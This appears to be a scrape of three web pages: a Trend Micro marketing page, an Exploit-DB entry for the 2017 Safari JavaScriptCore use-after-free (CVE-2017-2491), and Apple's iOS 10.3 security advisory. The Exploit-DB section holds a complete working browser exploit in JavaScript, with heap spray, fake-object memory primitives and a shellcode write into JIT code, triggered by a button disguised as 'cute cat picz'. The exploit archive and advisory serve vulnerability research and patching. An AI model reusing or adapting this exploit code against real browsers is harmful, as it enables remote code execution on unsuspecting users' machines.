[![Fischer Homes logo](https://trendmicro.scene7.com/is/image/trendmicro/fischer-homes-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Our cybersecurity posture is significantly stronger than it was 4 years ago."](/en_ie/about/customer-stories/fischer-homes.html)

[![Summit Carbon logo](https://trendmicro.scene7.com/is/image/trendmicro/summit-carbon-transparent-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Trend Vision One is amazing. [It gives] the ability to see and track a threat from potential to attack."](/en_ie/about/customer-stories/summit-carbon-solutions.html)

[![Decathlon logo](https://trendmicro.scene7.com/is/image/trendmicro/decathlon-white-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"We found Trend Vision One and Cloud App Security to secure our 100,000 Google users, easy to set up and deploy—which has been a major advantage."](/en_ie/about/customer-stories/decathlon.html)

[![KNMI logo](https://trendmicro.scene7.com/is/image/trendmicro/knmi-transparent-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Trend focuses broadly on all security aspects of the multi-cloud, not just on one small piece. That’s exactly what the KNMI was looking for."](/en_ie/about/customer-stories/knmi.html)

[![Xsolis](/content/dam/trendmicro/global/en/about/customer-stories/xsolis/xsolis-logo-white.svg)

"Trend has allowed us to sleep at night knowing that its security solutions are running 24/7. Companies that don’t take security seriously and invest wisely are taking on a much higher risk."](/en_ie/about/customer-stories/xsolis.html)

[![atlassian](/content/dam/trendmicro/global/en/about/customer-stories/atlassian/atlassian-logo-white.svg)

"We now have ongoing assurance that our cloud infrastructure is in a good and secure state."](/en_ie/about/customer-stories/atlassian.html)

[![SBV logo](/content/dam/trendmicro/global/en/about/customer-stories/dhr/dhr-logo-white.svg)

"My team has gotten 20 percent of its time back, allowing me to leverage their quality and move from being reactive to being proactive."](/en_ie/about/customer-stories/doctors-hospital-renaissance-health.html)

[![SBV logo](https://trendmicro.scene7.com/is/image/trendmicro/sbv-white-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"Since deploying Trend Micro, we’ve recorded millions of attacks, stopped 117,000 threats in one day, and had zero infections in 18 months. Trend Micro is always working, even while I’m sleeping."](/en_ie/about/customer-stories/sbv-services.html)

[![Ricoh](/content/dam/trendmicro/global/en/about/customer-stories/ricoh/ricoh-logo-white.svg)

"Ricoh USA uses Trend to drive a security-first culture to protect its environment."](/en_ie/about/customer-stories/ricoh-usa.html)

![Banijay Logo](/content/dam/trendmicro/global/en/about/customer-stories/banijay/banijay-gray.svg)

![Cox Logo](/content/dam/trendmicro/global/en/about/customer-stories/cox-group/cox-gray.svg)

![City of Columbia Logo](/content/dam/trendmicro/global/en/about/customer-stories/city-of-columbia/city-of-columbia-gray.svg)

![Databank logo](/content/dam/trendmicro/global/en/about/customer-stories/databank/databank-gray.svg)

![Decathlon logo](/content/dam/trendmicro/global/en/about/customer-stories/decathlon/decatholon-gray.svg)

![Dekalb County Schools District](/content/dam/trendmicro/global/en/about/customer-stories/dekalb-county-schools-district/delkab-county-gray.svg)

![DHR logo](/content/dam/trendmicro/global/en/about/customer-stories/dhr/dhr-gray.svg)

![Ellos Group ](/content/dam/trendmicro/global/en/about/customer-stories/ellos-group/ellos-group-gray.svg)

![Flowserve logo](/content/dam/trendmicro/global/en/about/customer-stories/flowserve/flowserve-gray.svg)

![Fujitsu logo](/content/dam/trendmicro/global/en/about/customer-stories/fujitsu/fujitsu-gray.svg)

![Matas logo](/content/dam/trendmicro/global/en/about/customer-stories/matas/matas-gray.svg)

![Nuffield Health logo](/content/dam/trendmicro/global/en/about/customer-stories/nuffield-health/nuffeild-health-gray.svg)

![Panasonic logo](/content/dam/trendmicro/global/en/about/customer-stories/panasonic-north-america/panasonic-gray.svg)

![Pizza Pizza logo](/content/dam/trendmicro/global/en/about/customer-stories/pizza-pizza/pizza-pizza-gray.svg)

![Ricoh USA logo](/content/dam/trendmicro/global/en/about/customer-stories/ricoh-usa/ricoh-gray.svg)

![ROC Oil logo](/content/dam/trendmicro/global/en/about/customer-stories/roc-oil/roc-gray.svg)

![Seneca College logo](/content/dam/trendmicro/global/en/about/customer-stories/seneca-college/seneca-gray.svg)

![State Bank of India logo](/content/dam/trendmicro/global/en/about/customer-stories/state-bank-of-india/sbi-gray.svg)

Cybersecurity insights

The latest research and expert perspectives

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

The Artificial Future: 2025 Security Predictions

Discover the critical cyber threats and trends shaping an AI-driven landscape.

* [Read blog](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/predictions/the-artificial-future-trend-micro-security-predictions-for-2025)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

See Why Customers Choose Us

Check out an easy-to-scan comparison of how we outperform the competition on multiple fronts

* [Learn more](/en_ie/about/compare.html)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

AI Pulse: What's New in AI Regulations

AI regulation is here to stay

* [Read more](/en_ie/research/24/i/ai-regulations-2024.html)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

Diving Deep Into Quantum Computing

An exploration of computing with quantum mechanics

* [Learn more](https://www.trendmicro.com/vinfo/ie/security/news/security-technology/diving-deep-into-quantum-computing-computing-with-quantum-mechanics)

![resource](/content/dam/trendmicro/global/en/core/images/icons/no-icon-transparent.svg)

2024 Cyber Risk Report

Discover proactive mitigation strategies and gain actionable insights

* [Read the report](https://www.trendmicro.com/vinfo/ie/security/news/cybercrime-and-digital-threats/intercepting-impact-2024-trend-micro-cyber-risk-report)

OUR IMPACT

The proof is in the numbers

6.5T+

Threat queries collected in 2023 alone

160B+

Threats blocked in 2023 alone

#1

Leader in Cloud Security

500K+

Global enterprise customers

* [See how](/content/dam/trendmicro/global/en/core/videos/overview/tm-why-we-are-a-leader-accolades.mp4)

###### JOIN 500K+ GLOBAL CUSTOMERS

Get started with Trend today

* [Let's talk](/en_ie/business/get-info-form.html)

### Resources

* [Blog](/en_ie/research.html)
* [Newsroom](/en_ie/about/newsroom.html)
* [Threat Reports](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/threat-reports)
* [Find a Partner](https://partner.trendmicro.com/partner-locator-home/)

### Support

* [Business Support Portal](https://success.trendmicro.com/en-US/)
* [Contact Us](/en_ie/business/get-info-form.html)
* [Downloads](/en_ie/business/products/downloads.html)
* [Free Trials](/en_ie/business/products/trials.html)

### About Trend

* [About Us](/en_ie/about.html)
* [Careers](/en_ie/about/careers.html)
* [Locations](/en_ie/contact.html)
* [Upcoming Events](/en_ie/about/events.html)
* [Trust Center](/en_ie/about/trust-center.html)

### Country Headquarters

* Trend Micro - Ireland (IE)
* Median House, Cork Business & Technology Park,
  Model Farm Road

  Cork, Ireland
* Phone:: +353 (0)21 730 7300

Select a country / region

expand\_more

close
#### The Americas

* [United States](/en_us.html)
* [Brasil](/pt_br.html)
* [Canada](/en_ca.html)
* [México](/es_mx.html)

#### Middle East & Africa

* [South Africa](/en_za.html)
* [Middle East and North Africa](/en_ae.html)

#### Europe

* [België (Belgium)](/en_be.html)
* [Česká Republika](http://www.trendmicro.cz/)
* [Danmark](/en_dk.html)
* [Deutschland, Österreich Schweiz](/de_de.html)
* [España](/es_es.html)
* [France](/fr_fr.html)
* [Ireland](/en_ie.html)
* [Italia](/it_it.html)
* [Nederland](/en_nl.html)
* [Norge (Norway)](/en_no.html)
* [Polska (Poland)](/pl_pl.html)
* [Suomi (Finland)](/en_fi.html)
* [Sverige (Sweden)](/en_se.html)
* [Türkiye (Turkey)](/tr_tr.html)
* [United Kingdom](/en_gb.html)

#### Asia & Pacific

* [Australia](/en_au.html)
* [Центральная Азия (Central Asia)](/ru_ru.html)
* [Hong Kong (English)](/en_hk.html)
* [香港 (中文) (Hong Kong)](/zh_hk.html)
* [भारत गणराज्य (India)](/en_in.html)
* [Indonesia](/in_id.html)
* [日本 (Japan)](/ja_jp.html)
* [대한민국 (South Korea)](/ko_kr/business.html)
* [Malaysia](/en_my.html)
* [Монголия (Mongolia) and рузия (Georgia)](/en_us.html)
* [New Zealand](/en_nz.html)
* [Philippines](/en_ph.html)
* [Singapore](/en_sg.html)
* [台灣 (Taiwan)](/zh_tw.html)
* [ประเทศไทย (Thailand)](/th_th.html)
* [Việt Nam](/vi_vn.html)

Experience our unified platform for free

* [Claim your 30-day trial](/en_ie/business/products/trials.html)

* [Privacy](/en_ie/about/trust-center/privacy.html)
* [Legal](/en_ie/about/legal.html)
* [Terms of Use](/en_ie/about/legal/terms-of-use.html)
* [Sitemap](/en_ie/business/sitemap.html)

Copyright ©2025 Trend Micro Incorporated. All rights reserved.

sXpIBdPeKzI9PC2p0SWMpUSM2NSxWzPyXTMLlbXmYa0R20xk



=== Content from www.exploit-db.com_23d65523_20250125_125414.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Apple Safari 10.0.3 - 'JSC::CachedCall' Use-After-Free

#### EDB-ID:

###### 41964

#### CVE:

###### [2017-2491](https://nvd.nist.gov/vuln/detail/CVE-2017-2491)

---

**EDB Verified:**

#### Author:

###### [saelo & niklasb](/?author=8952)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [macOS](/?platform=macos)

#### Date:

###### 2017-05-04

---

**Vulnerable App:**

```
<!--
Sources:
https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf
https://github.com/phoenhex/files/blob/master/exploits/cachedcall-uaf.html

Overview
The WebKit bug we used at Pwn2Own is CVE-2017-2491 / ZDI-17-231, a use-after-free of a JSString object in JavaScriptCore. By triggering it, we can obtain a dangling pointer to a JSString object in a JavaScript callback. At first, the specific scenario seems very hard to exploit, but we found a rather generic technique to still get a reliable read/write primitive out of it, although it requires a very large (~28 GiB) heap spray. This is possible even on a MacBook with 8 GB of RAM thanks to the page compression mechanism in macOS.

-->

<script>

function make_compiled_function() {
    function target(x) {
        return x*5 + x - x*x;
    }
    // Call only once so that function gets compiled with low level interpreter
    // but none of the optimizing JITs
    target(0);
    return target;
}

function pwn() {
    var haxs = new Array(0x100);
    for (var i = 0; i < 0x100; ++i)
        haxs[i] = new Uint8Array(0x100);

    // hax is surrounded by other Uint8Array instances. Thus *(&hax - 8) == 0x100,
    // which is the butterfly length if hax is later used as a butterfly for a
    // fake JSArray.
    var hax = haxs[0x80];
    var hax2 = haxs[0x81];

    var target_func = make_compiled_function();

    // Small helper to avoid allocations with .set(), so we don't mess up the heap
    function set(p, i, a,b,c,d,e,f,g,h) {
        p[i+0]=a; p[i+1]=b; p[i+2]=c; p[i+3]=d; p[i+4]=e; p[i+5]=f; p[i+6]=g; p[i+7]=h;
    }

    function spray() {
        var res = new Uint8Array(0x7ffff000);
        for (var i = 0; i < 0x7ffff000; i += 0x1000) {
            // Write heap pattern.
            // We only need a structure pointer every 128 bytes, but also some of
            // structure fields need to be != 0 and I can't remember which, so we just
            // write pointers everywhere.
            for (var j = 0; j < 0x1000; j += 8)
                set(res, i + j, 0x08, 0, 0, 0x50, 0x01, 0, 0, 0);

            // Write the offset to the beginning of each page so we know later
            // with which part we overlap.
            var j = i+1+2*8;
            set(res, j, j&0xff, (j>>8)&0xff, (j>>16)&0xff, (j>>24)&0xff, 0, 0, 0xff, 0xff);
        }
        return res;
    }

    // Spray ~14 GiB worth of array buffers with our pattern.
    var x = [
        spray(), spray(), spray(), spray(),
        spray(), spray(), spray(), spray(),
    ];

    // The butterfly of our fake object will point to 0x200000001. This will always
    // be inside the second sprayed buffer.
    var buf = x[1];

    // A big array to hold reference to objects we don't want to be freed.
    var ary = new Array(0x10000000);
    var cnt = 0;

    // Set up objects we need to trigger the bug.
    var n = 0x40000;
    var m = 10;
    var regex = new RegExp("(ab)".repeat(n), "g");
    var part = "ab".repeat(n);
    var s = (part + "|").repeat(m);

    // Set up some views to convert pointers to doubles
    var convert = new ArrayBuffer(0x20);
    var cu = new Uint8Array(convert);
    var cf = new Float64Array(convert);

    // Construct fake JSCell header
    set(cu, 0,
        0,0,0,0,  // structure ID
        8,        // indexing type
        0,0,0);   // some more stuff we don't care about

    var container = {
        // Inline object with indebufng type 8 and butterly pointing to hax.
        // Later we will refer to it as fakearray.
        jsCellHeader: cf[0],
        butterfly: hax,
    };

    while (1) {
        // Try to trigger bug
        s.replace(regex, function() {
            for (var i = 1; i < arguments.length-2; ++i) {
                if (typeof arguments[i] === 'string') {
                    // Root all the callback arguments to force GC at some point
                    ary[cnt++] = arguments[i];
                    continue;
                }
                var a = arguments[i];

                // a.butterfly points to 0x200000001, which is always
                // inside buf, but we are not sure what the exact
                // offset is within it so we read a marker value.
                var offset = a[2];

                // Compute addrof(container) + 16. We write to the fake array, then
                // read from a sprayed array buffer on the heap.
                a[2] = container;
                var addr = 0;
                for (var j = 7; j >= 0; --j)
                    addr = addr*0x100 + buf[offset + j];

                // Add 16 to get address of inline object
                addr += 16;

                // Do the inverse to get fakeobj(addr)
                for (var j = 0; j < 8; ++j) {
                    buf[offset + j] = addr & 0xff;
                    addr /= 0x100;
                }
                var fakearray = a[2];

                // Re-write the vector pointer of hax to point to hax2.
                fakearray[2] = hax2;

                // At this point hax.vector points to hax2, so we can write
                // the vector pointer of hax2 by writing to hax[16+{0..7}]

                // Leak address of JSFunction
                a[2] = target_func;
                addr = 0;
                for (var j = 7; j >= 0; --j)
                    addr = addr*0x100 + buf[offset + j];

                // Follow a bunch of pointers to RWX location containing the
                // function's compiled code
                addr += 3*8;
                for (var j = 0; j < 8; ++j) {
                    hax[16+j] = addr & 0xff;
                    addr /= 0x100;
                }
                addr = 0;
                for (var j = 7; j >= 0; --j)
                    addr = addr*0x100 + hax2[j];

                addr += 3*8;
                for (var j = 0; j < 8; ++j) {
                    hax[16+j] = addr & 0xff;
                    addr /= 0x100;
                }
                addr = 0;
                for (var j = 7; j >= 0; --j)
                    addr = addr*0x100 + hax2[j];

                addr += 4*8;
                for (var j = 0; j < 8; ++j) {
                    hax[16+j] = addr & 0xff;
                    addr /= 0x100;
                }
                addr = 0;
                for (var j = 7; j >= 0; --j)
                    addr = addr*0x100 + hax2[j];

                // Write shellcode
                for (var j = 0; j < 8; ++j) {
                    hax[16+j] = addr & 0xff;
                    addr /= 0x100;
                }
                hax2[0] = 0xcc;
                hax2[1] = 0xcc;
                hax2[2] = 0xcc;

                // Pwn.
                target_func();
            }
            return "x";
        });
    }
}
</script>

<button onclick="pwn()">click here for cute cat picz!</button>

```

**Tags:**

**Advisory/Source:**
[Link](https://phoenhex.re/2017-05-04/pwn2own17-cachedcall-uaf)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from support.apple.com_5b7447e8_20250125_125413.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of iOS 10.3

This document describes the security content of iOS 10.3.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## iOS 10.3

Released March 27, 2017

**Accounts**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A user may be able to view an Apple ID from the lock screen

Description: A prompt management issue was addressed by removing iCloud authentication prompts from the lock screen.

CVE-2017-2397: Suprovici Vadim of UniApps team, an anonymous researcher

**Audio**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted audio file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2430: an anonymous researcher working with Trend Micro’s Zero Day Initiative

CVE-2017-2462: an anonymous researcher working with Trend Micro’s Zero Day Initiative

**Carbon**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted .dfont file may lead to arbitrary code execution

Description: A buffer overflow existed in the handling of font files. This issue was addressed through improved bounds checking.

CVE-2017-2379: John Villamil, Doyensec, riusksk (泉哥) of Tencent Security Platform Department

**CoreGraphics**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted image may lead to a denial of service

Description: An infinite recursion was addressed through improved state management.

CVE-2017-2417: riusksk (泉哥) of Tencent Security Platform Department

**CoreGraphics**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2017-2444: Mei Wang of 360 GearTeam

**CoreText**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2435: John Villamil, Doyensec

**CoreText**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font may result in the disclosure of process memory

Description: An out-of-bounds read was addressed through improved input validation.

CVE-2017-2450: John Villamil, Doyensec

**CoreText**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted text message may lead to application denial of service

Description: A resource exhaustion issue was addressed through improved input validation.

CVE-2017-2461: Isaac Archambault of IDAoADI, an anonymous researcher

**DataAccess**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Configuring an Exchange account with a mistyped email address may resolve to an unexpected server

Description: An input validation issue existed in the handling of Exchange email addresses. This issue was addressed through improved input validation.

CVE-2017-2414: Ilya Nesterov and Maxim Goncharov

**FontParser**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2017-2487: riusksk (泉哥) of Tencent Security Platform Department

CVE-2017-2406: riusksk (泉哥) of Tencent Security Platform Department

**FontParser**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Parsing a maliciously crafted font file may lead to an unexpected application termination or arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2017-2407: riusksk (泉哥) of Tencent Security Platform Department

**FontParser**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font may result in the disclosure of process memory

Description: An out-of-bounds read was addressed through improved input validation.

CVE-2017-2439: John Villamil, Doyensec

**HomeKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Home Control may unexpectedly appear on Control Center

Description: A state issue existed in the handling of Home Control. This issue was addressed through improved validation.

CVE-2017-2434: Suyash Narain of India

**HTTPProtocol**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A malicious HTTP/2 server may be able to cause undefined behavior

Description: Multiple issues existed in nghttp2 before 1.17.0. These were addressed by updating nghttp2 to version 1.17.0.

CVE-2017-2428

Entry updated March 28, 2017

**ImageIO**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted image may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2416: Qidan He (何淇丹, @flanker\_hqd) of KeenLab, Tencent

**ImageIO**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Viewing a maliciously crafted JPEG file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2432: an anonymous researcher working with Trend Micro's Zero Day Initiative

**ImageIO**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted file may lead to an unexpected application termination or arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2017-2467

**ImageIO**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted image may lead to unexpected application termination

Description: An out-of-bound read existed in LibTIFF versions before 4.0.7. This was addressed by updating LibTIFF in ImageIO to version 4.0.7.

CVE-2016-3619

**iTunes Store**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An attacker in a privileged network position may be able to tamper with iTunes network traffic

Description: Requests to iTunes sandbox web services were sent in cleartext. This was addressed by enabling HTTPS.

CVE-2017-2412: Richard Shupak (linkedin.com/in/rshupak)

**JavaScriptCore**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2491: Apple

Entry added May 2, 2017

**JavaScriptCore**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted web page may lead to universal cross site scripting

Description: A prototype issue was addressed through improved logic.

CVE-2017-2492: lokihardt of Google Project Zero

